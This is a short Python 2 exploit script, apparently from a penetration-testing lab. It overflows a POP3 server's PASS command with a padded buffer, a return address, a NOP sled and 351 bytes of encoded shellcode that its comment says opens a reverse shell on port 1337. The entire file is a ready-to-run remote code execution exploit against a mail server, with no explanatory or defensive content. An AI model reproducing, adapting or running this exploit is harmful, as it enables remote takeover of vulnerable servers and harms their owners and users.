#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	# Reverse shell on port 1337

	shellcode = ("\xbf\x9b\x8f\xc9\x34\xdb\xdc\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x7a\x12\x83\xc2\x04\x03\xe1\x81\x2b\xc1\xe9\x76\x29"
"\x2a\x11\x87\x4e\xa2\xf4\xb6\x4e\xd0\x7d\xe8\x7e\x92\xd3\x05"
"\xf4\xf6\xc7\x9e\x78\xdf\xe8\x17\x36\x39\xc7\xa8\x6b\x79\x46"
"\x2b\x76\xae\xa8\x12\xb9\xa3\xa9\x53\xa4\x4e\xfb\x0c\xa2\xfd"
"\xeb\x39\xfe\x3d\x80\x72\xee\x45\x75\xc2\x11\x67\x28\x58\x48"
"\xa7\xcb\x8d\xe0\xee\xd3\xd2\xcd\xb9\x68\x20\xb9\x3b\xb8\x78"
"\x42\x97\x85\xb4\xb1\xe9\xc2\x73\x2a\x9c\x3a\x80\xd7\xa7\xf9"
"\xfa\x03\x2d\x19\x5c\xc7\x95\xc5\x5c\x04\x43\x8e\x53\xe1\x07"
"\xc8\x77\xf4\xc4\x63\x83\x7d\xeb\xa3\x05\xc5\xc8\x67\x4d\x9d"
"\x71\x3e\x2b\x70\x8d\x20\x94\x2d\x2b\x2b\x39\x39\x46\x76\x56"
"\x8e\x6b\x88\xa6\x98\xfc\xfb\x94\x07\x57\x93\x94\xc0\x71\x64"
"\xda\xfa\xc6\xfa\x25\x05\x37\xd3\xe1\x51\x67\x4b\xc3\xd9\xec"
"\x8b\xec\x0f\xa2\xdb\x42\xe0\x03\x8b\x22\x50\xec\xc1\xac\x8f"
"\x0c\xea\x66\xb8\xa7\x11\xe1\xcd\x3c\x19\xc2\xb9\x40\x19\x21"
"\x03\xcc\xff\x43\x63\x98\xa8\xfb\x1a\x81\x22\x9d\xe3\x1f\x4f"
"\x9d\x68\xac\xb0\x50\x99\xd9\xa2\x05\x69\x94\x98\x80\x76\x02"
"\xb4\x4f\xe4\xc9\x44\x19\x15\x46\x13\x4e\xeb\x9f\xf1\x62\x52"
"\x36\xe7\x7e\x02\x71\xa3\xa4\xf7\x7c\x2a\x28\x43\x5b\x3c\xf4"
"\x4c\xe7\x68\xa8\x1a\xb1\xc6\x0e\xf5\x73\xb0\xd8\xaa\xdd\x54"
"\x9c\x80\xdd\x22\xa1\xcc\xab\xca\x10\xb9\xed\xf5\x9d\x2d\xfa"
"\x8e\xc3\xcd\x05\x45\x40\xfd\x4f\xc7\xe1\x96\x09\x92\xb3\xfa"
"\xa9\x49\xf7\x02\x2a\x7b\x88\xf0\x32\x0e\x8d\xbd\xf4\xe3\xff"
"\xae\x90\x03\x53\xce\xb0")

	# \x90 * 16 are NOPs | shellcode size 351 bytes
	buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2606-4-351-16)

	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock_conn = sock.connect(("10.11.21.97", 110))
		data = sock.recv(1024)
		print data
	
		sock.send("USER test\r\n")
		data = sock.recv(1024)
		print data

		sock.send("PASS {0}\r\n".format(buff))
		data = sock.recv(1024)
		print data
	except socket.error:
		print("[x] Unable to connect...")
	finally:
		sock.close()
		sys.exit(0)

